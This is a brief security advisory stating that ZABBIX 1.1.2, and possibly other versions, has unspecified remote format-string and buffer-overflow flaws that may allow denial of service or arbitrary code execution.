ZABBIX is prone to multiple unspecified remote code-execution vulnerabilities.

Reports indicate that these issues facilitate format-string and buffer-overflow attacks. A remote attacker may leverage these vulnerabilities to trigger denial-of-service conditions or to execute arbitrary code to gain unauthorized access to a vulnerable computer. This would occur in the context of the application.

ZABBIX version 1.1.2 is reported vulnerable; other versions may be affected as well.
